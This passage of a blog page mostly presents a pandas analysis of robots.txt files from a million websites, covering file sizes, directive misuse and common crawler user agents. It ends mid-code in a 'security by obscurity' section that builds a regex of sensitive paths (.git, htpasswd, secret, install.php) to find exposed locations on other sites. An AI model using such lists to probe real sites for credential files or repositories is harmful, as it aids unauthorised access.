</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>Hashflags.FETCH().then(val =&gt; {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>  hf <span style=color:#000;font-weight:700>=</span> <span style=color:#000;font-weight:700>new</span> Hashflags(val);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>  console.log(hf.activeHashflags);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>});
</span></span></code></pre></div><p>So there you have it, a quick introduction to Twitter hashflags via Azure Functions and an npm library. If you&rsquo;ve got any questions please leave a comment below, or reach out to me on Twitter <a href=https://twitter.com/Jamie_Magee>@Jamie_Magee</a>.</p></div><div class=post><h1 class=post-title><a href=/blog/a-survey-of-robots-txt-part-two/>A survey of robots.txt - part two</a></h1><span class=post-date>Mar 22, 2018 &#183; 6 minute read &#183; <a href=/blog/a-survey-of-robots-txt-part-two/#disqus_thread>Comments</a></span><p>In <a href=/posts/a-survey-of-robots-txt-part-one/>part one</a> of this article, I collected <code>robots.txt</code> from the top 1 million sites on the web. In this article I&rsquo;m going to do some analysis, and see if there&rsquo;s anything interesting to find from all the files I&rsquo;ve collected.</p><p>First we&rsquo;ll start with some setup.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#000;font-weight:700>%</span>matplotlib inline
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#000;font-weight:700>import</span> <span style=color:#555>pandas</span> <span style=color:#000;font-weight:700>as</span> <span style=color:#555>pd</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#000;font-weight:700>import</span> <span style=color:#555>numpy</span> <span style=color:#000;font-weight:700>as</span> <span style=color:#555>np</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#000;font-weight:700>import</span> <span style=color:#555>glob</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span><span style=color:#000;font-weight:700>import</span> <span style=color:#555>os</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span><span style=color:#000;font-weight:700>import</span> <span style=color:#555>matplotlib</span>
</span></span></code></pre></div><p>Next I&rsquo;m going to load the content of each file into my pandas dataframe, calculate the file size, and store that for later.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>l <span style=color:#000;font-weight:700>=</span> [filename<span style=color:#000;font-weight:700>.</span>split(<span style=color:#d14>&#39;/&#39;</span>)[<span style=color:#099>1</span>] <span style=color:#000;font-weight:700>for</span> filename <span style=color:#000;font-weight:700>in</span> glob<span style=color:#000;font-weight:700>.</span>glob(<span style=color:#d14>&#39;robots-txt/\*&#39;</span>)]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>df <span style=color:#000;font-weight:700>=</span> pd<span style=color:#000;font-weight:700>.</span>DataFrame(l, columns<span style=color:#000;font-weight:700>=</span>[<span style=color:#d14>&#39;domain&#39;</span>])
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>df[<span style=color:#d14>&#39;content&#39;</span>] <span style=color:#000;font-weight:700>=</span> df<span style=color:#000;font-weight:700>.</span>apply(<span style=color:#000;font-weight:700>lambda</span> x: <span style=color:#0086b3>open</span>(<span style=color:#d14>&#39;robots-txt/&#39;</span> <span style=color:#000;font-weight:700>+</span> x[<span style=color:#d14>&#39;domain&#39;</span>])<span style=color:#000;font-weight:700>.</span>read(), axis<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>df[<span style=color:#d14>&#39;size&#39;</span>] <span style=color:#000;font-weight:700>=</span> df<span style=color:#000;font-weight:700>.</span>apply(<span style=color:#000;font-weight:700>lambda</span> x: os<span style=color:#000;font-weight:700>.</span>path<span style=color:#000;font-weight:700>.</span>getsize(<span style=color:#d14>&#39;robots-txt/&#39;</span> <span style=color:#000;font-weight:700>+</span> x[<span style=color:#d14>&#39;domain&#39;</span>]), axis<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>df<span style=color:#000;font-weight:700>.</span>sample(<span style=color:#099>5</span>)
</span></span></code></pre></div><div style=overflow-x:auto><table border=1><thead><tr><th></th><th>domain</th><th>content</th><th>size</th></tr></thead><tbody><tr><th>612419</th><td>veapple.com</td><td>User-agent: *\nAllow: /\n\nSitemap: http://www...</td><td>260</td></tr><tr><th>622296</th><td>buscadortransportes.com</td><td>User-agent: *\nDisallow: /out/</td><td>29</td></tr><tr><th>147795</th><td>dailynews360.com</td><td>User-agent: *\nAllow: /\n\nDisallow: /search/\...</td><td>248</td></tr><tr><th>72823</th><td>newfoundlandpower.com</td><td>User-agent: *\nDisallow: /Search.aspx\nDisallo...</td><td>528</td></tr><tr><th>601408</th><td>xfwed.com</td><td>#\n# robots.txt for www.xfwed.com\n# Version 3...</td><td>201</td></tr></tbody></table></div><h1 id=file-sizes>File sizes</h1><p>Now that we&rsquo;ve done the setup, let&rsquo;s see what the spread of file sizes in <code>robots.txt</code> is.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>fig <span style=color:#000;font-weight:700>=</span> df<span style=color:#000;font-weight:700>.</span>plot<span style=color:#000;font-weight:700>.</span>hist(title<span style=color:#000;font-weight:700>=</span><span style=color:#d14>&#39;robots.txt file size&#39;</span>, bins<span style=color:#000;font-weight:700>=</span><span style=color:#099>20</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>fig<span style=color:#000;font-weight:700>.</span>set_yscale(<span style=color:#d14>&#39;log&#39;</span>)
</span></span></code></pre></div><p><img src=/img/analysis_5_0.png alt=png></p><p>It looks like the majority of <code>robots.txt</code> are under 250KB in size. This is really no surprise as <code>robots.txt</code> supports regex, so complex rulesets can be built easily.</p><p>Let&rsquo;s take a look at the files larger than 1MB. I can think of three possibilities: they&rsquo;re automatically maintained; they&rsquo;re some other file masquerading as <code>robots.txt</code>; or the site is doing something seriously wrong.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>large <span style=color:#000;font-weight:700>=</span> df[df[<span style=color:#d14>&#39;size&#39;</span>] <span style=color:#000;font-weight:700>&gt;</span> <span style=color:#099>10</span> <span style=color:#000;font-weight:700>**</span> <span style=color:#099>6</span>]<span style=color:#000;font-weight:700>.</span>sort_values(by<span style=color:#000;font-weight:700>=</span><span style=color:#d14>&#39;size&#39;</span>, ascending<span style=color:#000;font-weight:700>=</span><span style=color:#000;font-weight:700>False</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#000;font-weight:700>import</span> <span style=color:#555>re</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#000;font-weight:700>def</span> <span style=color:#900;font-weight:700>count_directives</span>(value, domain):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>content <span style=color:#000;font-weight:700>=</span> domain[<span style=color:#d14>&#39;content&#39;</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#000;font-weight:700>return</span> <span style=color:#0086b3>len</span>(re<span style=color:#000;font-weight:700>.</span>findall(value, content, re<span style=color:#000;font-weight:700>.</span>IGNORECASE))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>large[<span style=color:#d14>&#39;disallow&#39;</span>] <span style=color:#000;font-weight:700>=</span> large<span style=color:#000;font-weight:700>.</span>apply(<span style=color:#000;font-weight:700>lambda</span> x: count_directives(<span style=color:#d14>&#39;Disallow&#39;</span>, x), axis<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>large[<span style=color:#d14>&#39;user-agent&#39;</span>] <span style=color:#000;font-weight:700>=</span> large<span style=color:#000;font-weight:700>.</span>apply(<span style=color:#000;font-weight:700>lambda</span> x: count_directives(<span style=color:#d14>&#39;User-agent&#39;</span>, x), axis<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>large[<span style=color:#d14>&#39;comments&#39;</span>] <span style=color:#000;font-weight:700>=</span> large<span style=color:#000;font-weight:700>.</span>apply(<span style=color:#000;font-weight:700>lambda</span> x: count_directives(<span style=color:#d14>&#39;#&#39;</span>, x), axis<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#998;font-style:italic># The directives below are non-standard</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>large[<span style=color:#d14>&#39;crawl-delay&#39;</span>] <span style=color:#000;font-weight:700>=</span> large<span style=color:#000;font-weight:700>.</span>apply(<span style=color:#000;font-weight:700>lambda</span> x: count_directives(<span style=color:#d14>&#39;Crawl-delay&#39;</span>, x), axis<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>large[<span style=color:#d14>&#39;allow&#39;</span>] <span style=color:#000;font-weight:700>=</span> large<span style=color:#000;font-weight:700>.</span>apply(<span style=color:#000;font-weight:700>lambda</span> x: count_directives(<span style=color:#d14>&#39;Allow&#39;</span>, x), axis<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>large[<span style=color:#d14>&#39;sitemap&#39;</span>] <span style=color:#000;font-weight:700>=</span> large<span style=color:#000;font-weight:700>.</span>apply(<span style=color:#000;font-weight:700>lambda</span> x: count_directives(<span style=color:#d14>&#39;Sitemap&#39;</span>, x), axis<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>large[<span style=color:#d14>&#39;host&#39;</span>] <span style=color:#000;font-weight:700>=</span> large<span style=color:#000;font-weight:700>.</span>apply(<span style=color:#000;font-weight:700>lambda</span> x: count_directives(<span style=color:#d14>&#39;Host&#39;</span>, x), axis<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>large
</span></span></code></pre></div><div style=overflow-x:auto><table><thead><tr><th></th><th>domain</th><th>content</th><th>size</th><th>disallow</th><th>user-agent</th><th>comments</th><th>crawl-delay</th><th>allow</th><th>sitemap</th><th>host</th></tr></thead><tbody><tr><th>632170</th><td>haberborsa.com.tr</td><td>User-agent: *\nAllow: /\n\nDisallow: /?ref=\nD...</td><td>5820350</td><td>71244</td><td>2</td><td>0</td><td>0</td><td>71245</td><td>5</td><td>10</td></tr><tr><th>23216</th><td>miradavetiye.com</td><td>Sitemap: https://www.miradavetiye.com/sitemap_...</td><td>5028384</td><td>47026</td><td>7</td><td>0</td><td>0</td><td>47026</td><td>2</td><td>0</td></tr><tr><th>282904</th><td>americanrvcompany.com</td><td>Sitemap: http://www.americanrvcompany.com/site...</td><td>4904266</td><td>56846</td><td>1</td><td>1</td><td>0</td><td>56852</td><td>2</td><td>0</td></tr><tr><th>446326</th><td>exibart.com</td><td>User-Agent: *\nAllow: /\nDisallow: /notizia.as...</td><td>3275088</td><td>61403</td><td>1</td><td>0</td><td>0</td><td>61404</td><td>0</td><td>0</td></tr><tr><th>579263</th><td>sinospectroscopy.org.cn</td><td>http://www.sinospectroscopy.org.cn/readnews.ph...</td><td>2979133</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><th>55309</th><td>vibralia.com</td><td># robots.txt automaticaly generated by PrestaS...</td><td>2835552</td><td>39712</td><td>1</td><td>15</td><td>0</td><td>39736</td><td>0</td><td>0</td></tr><tr><th>124850</th><td>oftalmolog30.ru</td><td>User-Agent: *\nHost: chuzmsch.ru\nSitemap: htt...</td><td>2831975</td><td>87752</td><td>1</td><td>0</td><td>0</td><td>87752</td><td>2</td><td>2</td></tr><tr><th>557116</th><td>la-viephoto.com</td><td>User-Agent:*\nDisallow:/aloha_blog/\nDisallow:...</td><td>2768134</td><td>29782</td><td>2</td><td>0</td><td>0</td><td>29782</td><td>2</td><td>0</td></tr><tr><th>677400</th><td>bigclozet.com</td><td>User-agent: *\nDisallow: /item/\n\nUser-agent:...</td><td>2708717</td><td>51221</td><td>4</td><td>0</td><td>0</td><td>51221</td><td>0</td><td>0</td></tr><tr><th>621834</th><td>tranzilla.ru</td><td>Host: tranzilla.ru\nSitemap: http://tranzilla....</td><td>2133091</td><td>27647</td><td>1</td><td>0</td><td>0</td><td>27648</td><td>2</td><td>1</td></tr><tr><th>428735</th><td>autobaraholka.com</td><td>User-Agent: *\nDisallow: /registration/\nDisal...</td><td>1756983</td><td>39330</td><td>1</td><td>0</td><td>0</td><td>39330</td><td>0</td><td>2</td></tr><tr><th>628591</th><td>megasmokers.ru</td><td>User-agent: *\nDisallow: /*route=account/\nDis...</td><td>1633963</td><td>92</td><td>2</td><td>0</td><td>0</td><td>92</td><td>2</td><td>1</td></tr><tr><th>647336</th><td>valencia-cityguide.com</td><td># If the Joomla site is installed within a fol...</td><td>1559086</td><td>17719</td><td>1</td><td>12</td><td>0</td><td>17719</td><td>1</td><td>99</td></tr><tr><th>663372</th><td>vetality.fr</td><td># robots.txt automaticaly generated by PrestaS...</td><td>1536758</td><td>27737</td><td>1</td><td>12</td><td>0</td><td>27737</td><td>0</td><td>0</td></tr><tr><th>105735</th><td>golden-bee.ru</td><td>User-agent: Yandex\nDisallow: /*_openstat\nDis...</td><td>1139308</td><td>24081</td><td>4</td><td>1</td><td>0</td><td>24081</td><td>0</td><td>1</td></tr><tr><th>454311</th><td>dreamitalive.com</td><td>user-agent: google\ndisallow: /memberprofileda...</td><td>1116416</td><td>34392</td><td>3</td><td>0</td><td>0</td><td>34401</td><td>0</td><td>9</td></tr><tr><th>245895</th><td>gobankingrates.com</td><td>User-agent: *\nDisallow: /wp-admin/\nAllow: /w...</td><td>1018109</td><td>7362</td><td>28</td><td>20</td><td>2</td><td>7363</td><td>0</td><td>0</td></tr></tbody></table></div><p>It looks like all of these sites are misusing <code>Disallow</code> and <code>Allow</code>. In fact, looking at the raw files it appears as if they list all of the articles on the site under an individual <code>Disallow</code> command. I can only guess that when publishing an article, a corresponding line in <code>robots.txt</code> is added.</p><p>Now let&rsquo;s take a look at the smallest <code>robots.txt</code></p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>small <span style=color:#000;font-weight:700>=</span> df[df[<span style=color:#d14>&#39;size&#39;</span>] <span style=color:#000;font-weight:700>&gt;</span> <span style=color:#099>0</span>]<span style=color:#000;font-weight:700>.</span>sort_values(by<span style=color:#000;font-weight:700>=</span><span style=color:#d14>&#39;size&#39;</span>, ascending<span style=color:#000;font-weight:700>=</span><span style=color:#000;font-weight:700>True</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>small<span style=color:#000;font-weight:700>.</span>head(<span style=color:#099>5</span>)
</span></span></code></pre></div><div><table><thead><tr><th></th><th>domain</th><th>content</th><th>size</th></tr></thead><tbody><tr><th>336828</th><td>iforce2d.net</td><td>\n</td><td>1</td></tr><tr><th>55335</th><td>togetherabroad.nl</td><td>\n</td><td>1</td></tr><tr><th>471397</th><td>behchat.ir</td><td>\n</td><td>1</td></tr><tr><th>257727</th><td>docteurtamalou.fr</td><td></td><td>1</td></tr><tr><th>669247</th><td>lastminute-cottages.co.uk</td><td>\n</td><td>1</td></tr></tbody></table></div><p>There&rsquo;s not really anything interesting here, so let&rsquo;s take a look at some larger files</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>small <span style=color:#000;font-weight:700>=</span> df[df[<span style=color:#d14>&#39;size&#39;</span>] <span style=color:#000;font-weight:700>&gt;</span> <span style=color:#099>10</span>]<span style=color:#000;font-weight:700>.</span>sort_values(by<span style=color:#000;font-weight:700>=</span><span style=color:#d14>&#39;size&#39;</span>, ascending<span style=color:#000;font-weight:700>=</span><span style=color:#000;font-weight:700>True</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>small<span style=color:#000;font-weight:700>.</span>head(<span style=color:#099>5</span>)
</span></span></code></pre></div><div><table><thead><tr><th></th><th>domain</th><th>content</th><th>size</th></tr></thead><tbody><tr><th>676951</th><td>fortisbc.com</td><td>sitemap.xml</td><td>11</td></tr><tr><th>369859</th><td>aurora.com.cn</td><td>User-agent:</td><td>11</td></tr><tr><th>329775</th><td>klue.kr</td><td>Disallow: /</td><td>11</td></tr><tr><th>390064</th><td>chneic.sh.cn</td><td>Disallow: /</td><td>11</td></tr><tr><th>355604</th><td>hpi-mdf.com</td><td>Disallow: /</td><td>11</td></tr></tbody></table></div><p><code>Disallow: /</code> tells all webcrawlers not to crawl anything on this site, and should (hopefully) keep it out of any search engines, but not all webcrawlers follow <code>robots.txt</code>.</p><h1 id=user-agents>User agents</h1><p>User agents can be listed in <code>robots.txt</code> to either <code>Allow</code> or <code>Disallow</code> certain paths. Let&rsquo;s take a look at the most common webcrawlers.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#000;font-weight:700>from</span> <span style=color:#555>collections</span> <span style=color:#000;font-weight:700>import</span> Counter
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#000;font-weight:700>def</span> <span style=color:#900;font-weight:700>find_user_agents</span>(content):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>    <span style=color:#000;font-weight:700>return</span> re<span style=color:#000;font-weight:700>.</span>findall(<span style=color:#d14>&#39;User-agent:? (.*)&#39;</span>, content)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>user_agent_list <span style=color:#000;font-weight:700>=</span> [find_user_agents(x) <span style=color:#000;font-weight:700>for</span> x <span style=color:#000;font-weight:700>in</span> df[<span style=color:#d14>&#39;content&#39;</span>]]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>user_agent_count <span style=color:#000;font-weight:700>=</span> Counter(x<span style=color:#000;font-weight:700>.</span>strip() <span style=color:#000;font-weight:700>for</span> xs <span style=color:#000;font-weight:700>in</span> user_agent_list <span style=color:#000;font-weight:700>for</span> x <span style=color:#000;font-weight:700>in</span> <span style=color:#0086b3>set</span>(xs))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>user_agent_count<span style=color:#000;font-weight:700>.</span>most_common(n<span style=color:#000;font-weight:700>=</span><span style=color:#099>10</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>[(<span style=color:#d14>&#39;*&#39;</span>, <span style=color:#099>587729</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>(<span style=color:#d14>&#39;Mediapartners-Google&#39;</span>, <span style=color:#099>36654</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>(<span style=color:#d14>&#39;Yandex&#39;</span>, <span style=color:#099>29065</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>(<span style=color:#d14>&#39;Googlebot&#39;</span>, <span style=color:#099>25932</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>(<span style=color:#d14>&#39;MJ12bot&#39;</span>, <span style=color:#099>22250</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>(<span style=color:#d14>&#39;Googlebot-Image&#39;</span>, <span style=color:#099>16680</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>(<span style=color:#d14>&#39;Baiduspider&#39;</span>, <span style=color:#099>13646</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>(<span style=color:#d14>&#39;ia_archiver&#39;</span>, <span style=color:#099>13592</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>(<span style=color:#d14>&#39;Nutch&#39;</span>, <span style=color:#099>11204</span>),
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>(<span style=color:#d14>&#39;AhrefsBot&#39;</span>, <span style=color:#099>11108</span>)]
</span></span></code></pre></div><p>It&rsquo;s no surprise that the top result is a wildcard (<code>*</code>). Google takes spots 2, 4, and 6 with their AdSense, search and image web crawlers respectively. It does seem a little strange to see the AdSense bot listed above the usual search web crawler. Some of the other large search engines&rsquo; bots are also found in the top 10: Yandex, Baidu, and Yahoo (<code>Slurp</code>). <code>MJ12bot</code> is a crawler I had not heard of before, but according to <a href=http://mj12bot.com/>their site</a> it belongs to a UK based SEO company—and according to some of the results about it, it doesn&rsquo;t behave very well. <code>ia_archiver</code> belongs to <a href=https://archive.org/>The Internet Archive</a>, and (I assume) crawls pages for the <a href=https://archive.org/web/>Wayback Machine</a>. Finally there is <a href=https://nutch.apache.org/bot.html>Apache Nutch</a>, an open source webcrawler that can be run by anyone.</p><h1 id=security-by-obscurity>Security by obscurity</h1><p>There are certain paths that you might not want a webcrawler to know about. For example, a <code>.git</code> directory, <code>htpasswd</code> files, or parts of a site that are still in testing, and aren&rsquo;t meant to be found by anyone on Google. Let&rsquo;s see if there&rsquo;s anything interesting.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>sec_obs <span style=color:#000;font-weight:700>=</span> [<span style=color:#d14>&#39;\.git&#39;</span>, <span style=color:#d14>&#39;alpha&#39;</span>, <span style=color:#d14>&#39;beta&#39;</span>, <span style=color:#d14>&#39;secret&#39;</span>, <span style=color:#d14>&#39;htpasswd&#39;</span>, <span style=color:#d14>&#39;install\.php&#39;</span>, <span style=color:#d14>&#39;setup\.php&#39;</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>sec_obs_regex <span style=color:#000;font-weight:700>=</span> re<span style=color:#000;font-weight:700>.</span>compile(<span style=color:#d14>&#39;|&#39;</span><span style=color:#000;font-weight:700>.</span>join(sec_obs))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#000;font-weight:700>def</span> <span style=color:#900;font-weight:700>find_security_by_obscurity</span>(content):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#000;font-weight:700>return</span> sec_obs_regex<span style=color:#000;font-weight:700>.</span>findall(content)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>
